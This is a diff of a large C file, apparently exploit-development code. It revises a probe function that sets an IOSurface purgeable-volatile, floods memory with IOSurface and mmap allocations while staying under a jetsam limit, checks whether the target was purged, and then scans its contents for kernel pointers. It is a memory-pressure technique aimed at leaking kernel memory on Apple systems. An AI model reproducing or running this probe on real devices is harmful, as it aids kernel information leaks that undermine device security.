@@ -16528,8 +16528,10 @@ static void r414_probe(void) {
             kIOSurfacePurgeableVolatile, &oldState);
         rlog("    Target set volatile: ret=0x%x oldState=%u\n", ret, oldState);
 
-        /* Create massive IOSurface pressure - 2MB each × 400 = 800MB */
-        int pw = 512, ph = 512, pbpr = 2048, pas = 2 * 1024 * 1024;
+        /* Gradual pressure with periodic purge checks.
+         * Stay under ~1.5GB to avoid jetsam kill.
+         */
+        int pw = 256, ph = 256, pbpr = 1024, pas = 1 * 1024 * 1024;
         CFNumberRef pv[] = {
             CFNumberCreate(NULL, kCFNumberIntType, &pw),
             CFNumberCreate(NULL, kCFNumberIntType, &ph),
@@ -16542,33 +16544,57 @@ static void r414_probe(void) {
             &kCFTypeDictionaryKeyCallBacks,
             &kCFTypeDictionaryValueCallBacks);
 
-        IOSurfaceRef pressure[400];
+        IOSurfaceRef pressure[200];
         int created = 0;
-        for (int i = 0; i < 400; i++) {
+        int purgeDetected = 0;
+        for (int i = 0; i < 200 && !purgeDetected; i++) {
             pressure[i] = IOSurfaceCreate(pprops);
-            if (!pressure[i]) break;
-            /* Force allocation by writing */
+            if (!pressure[i]) {
+                rlog("    IOSurfaceCreate failed at i=%d\n", i);
+                break;
+            }
             IOSurfaceLock(pressure[i], 0, NULL);
             void *pb = IOSurfaceGetBaseAddress(pressure[i]);
-            if (pb) memset(pb, 0x42 + (i & 0xFF), 4096);
+            if (pb) memset(pb, 0x42, 4096);
             IOSurfaceUnlock(pressure[i], 0, NULL);
             created++;
-        }
-        rlog("    Created %d × 2MB pressure surfaces = %dMB\n",
-            created, created * 2);
 
-        /* Also add mmap pressure on top */
-        void *mmapPressure[50];
+            /* Check purge every 20 surfaces */
+            if ((i + 1) % 20 == 0) {
+                uint32_t chk = 0;
+                IOSurfaceSetPurgeable(target,
+                    kIOSurfacePurgeableKeepCurrent, &chk);
+                if (chk > kIOSurfacePurgeableVolatile) {
+                    rlog("    PURGED at %d surfaces (%dMB)!\n",
+                        created, created);
+                    purgeDetected = 1;
+                }
+            }
+        }
+        rlog("    Created %d × 1MB pressure surfaces = %dMB\n",
+            created, created);
+
+        /* If not purged yet, add mmap pressure (conservative) */
+        void *mmapPressure[20];
         int mmapCount = 0;
-        for (int i = 0; i < 50; i++) {
-            mmapPressure[i] = mmap(NULL, 64 * 1024 * 1024,
-                PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
-            if (mmapPressure[i] != MAP_FAILED) {
+        if (!purgeDetected) {
+            for (int i = 0; i < 20 && !purgeDetected; i++) {
+                mmapPressure[i] = mmap(NULL, 64 * 1024 * 1024,
+                    PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+                if (mmapPressure[i] == MAP_FAILED) break;
                 memset(mmapPressure[i], 0x99, 64 * 1024 * 1024);
                 mmapCount++;
-            } else break;
+
+                uint32_t chk = 0;
+                IOSurfaceSetPurgeable(target,
+                    kIOSurfacePurgeableKeepCurrent, &chk);
+                if (chk > kIOSurfacePurgeableVolatile) {
+                    rlog("    PURGED after %dMB mmap!\n", mmapCount * 64);
+                    purgeDetected = 1;
+                }
+            }
         }
-        rlog("    + %d × 64MB mmap = %dMB total extra\n",
+        rlog("    + %d × 64MB mmap = %dMB\n",
             mmapCount, mmapCount * 64);
 
         /* Check if target was purged */
@@ -16605,7 +16631,7 @@ static void r414_probe(void) {
             nonZero, aaCount, kptrs);
         IOSurfaceUnlock(target, kIOSurfaceLockReadOnly, NULL);
 
-        /* Cleanup */
+        /* Cleanup - release pressure first */
         for (int i = 0; i < mmapCount; i++)
             munmap(mmapPressure[i], 64 * 1024 * 1024);
         for (int i = 0; i < created; i++)
